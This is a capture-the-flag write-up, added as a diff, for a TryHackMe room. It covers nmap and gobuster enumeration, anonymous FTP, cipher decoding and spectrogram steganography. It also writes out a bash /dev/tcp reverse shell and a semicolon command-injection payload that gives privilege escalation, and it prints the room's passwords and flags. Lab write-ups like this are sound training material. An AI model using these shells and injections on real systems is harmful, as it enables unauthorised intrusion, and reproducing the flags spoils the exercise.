@@ -1,0 +1,115 @@
+THM - Break Out The Cage
+==================================================================
+tryhackme.com/room/breakoutthecage1
+github.com/ttnovo/breakouthecage
+by: TTNOVO 
+
+IP: 10.10.124.42
+SSH USER:weston@IP
+PASSWORD:Mydadisghostrideraintthatcoolnocausehesonfirejokes
+KEY:namelesstwo
+==================================================================
+If you use own VM you need to use VPN.
+
+1. Download your VPN file on THM if you haven’t done that already, find it and do following command: sudo openvpn FILE.ovpn
+2. then hit your password and you ready to dive in...
+
+I would like to add, do not use these tools on a network youre not allowed to scan, its illegal and they see what you do.
+===================================================================
+1. What is Weston's password?
+
+Lets start with our old favorites, NMAP scan. nmap -sC -sV IP (ports open 21,22,80)
+Also Gobuster to find hidden sites. gobuster dir -u http://IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+Meanwhile lets look at the website. I didnt find anything special, lets go deeper.
+
+Lets try login to the FTP server as anonymous with no password, this we know from the nmap scan. Notice the dad_task.
+
+ftp IP
+anonymous
+la -la
+get dad_tasks
+exit
+cat dad_tasks
+
+The file is encrypted so lets just decrypt it. If you find it dificult you could use: boxentriq.com/code-breaking/cipher-identifier
+It will tell you its base64, decrypt the base64 with this: base64decode.org/ and you will see its still encrypted. Do the same
+as we did first and you will see its specifik encrypted as Vigenere.
+
+To decrypt Vigenere from dcode.fr/vigenere-cipher you need to have a key.
+
+Gobuster found: /auditions that linked a mp3 file, I remember you can actually put information in any file, so I looked it up by using SonicVisualizer.
+
+wget http://IP/auditions/must_practice_corrupt_file.mp3
+ls
+sudo apt-get install sonic-visualiser (Skip if you alredy have it installed)
+
+Add the file to the SonicVisualizer and press pane>add spectrogram>all channels
+Change color to sunset, zoom in! 
+Key: namelesstwo
+
+Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
+One. Revamp the website
+Two. Put more quotes in script
+Three. Buy bee pesticide
+Four. Help him with acting lessons
+Five. Teach Dad what "information security" is.
+
+In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
+
+Answer: Mydadisghostrideraintthatcoolnocausehesonfirejokes
+==========================================================================================
+2. What's the user flag?
+
+Because we know from the mainpage its weston as a user, and we have the cracked password aswell for SSH port is open... we could SSH us in.
+
+SSH weston@IP 
+pwd (to see where we are)
+ls -al (to see what we have, I didnt find anything here)
+cd ..
+ls (notice cage user, you can not sadly enter it. I guess here we find our flags)
+sudo -l (/usr/bin/bees is root, lets use that to be cage)
+/usr/bin/bees (to run the bash script, which is just a broadcast message)
+
+find / -type f -user cage 2>/dev/null (You will find two other scripts, which is python scripts owned by the cage user)  
+You could cat them (cat /opt/.dads_scripts/spread_the_quotes.py) and see what they do,
+the first one is more of a function for the wall, so it spits out random words. And the other seems to be the file it reads from.
+
+This is intresting. Lets netcat it to than create a reverse shell. Use the following code after NC to create a reverse shell.
+I added rlwrap becuase I found it dificult to use without it. So I kept it for this writeup.
+
+rlwrap nc -nlvp 4100
+
+The IP may confuse you, its the IP adress of your machine, do an ip addr. 
+
+cat > /tmp/shell.sh << EOF
+#!/bin/bash
+bash -i >& /dev/tcp/10.9.2.20/4100 0>&1
+EOF
+
+chmod +x /tmp/shell.sh
+printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
+
+Wait for some minutes, arround 3-4 minutes and you will soon get responce from the script. Crazy right? You CAGE!
+
+ls
+cat Super_Duper_Checklist
+
+Answer: THM{M37AL_0R_P3N_T35T1NG}
+
+3. What's the root flag?
+
+In the same CAGE user we also saw another file, lets look at it.
+The email has this weird string "haiinspsyanileph" with key "face" if we crack it with
+boxentriq.com/code-breaking/vigenere-cipher
+we get this: cageisnotalegend
+Lets try if it works on the 2nd terminal, the one we SSH with. We should be root! 
+
+whoami (root? yepp)
+cd /root
+ls -al
+cd email_backup
+ls -al
+cat email_2
+
+Answer:THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
+==================================================================
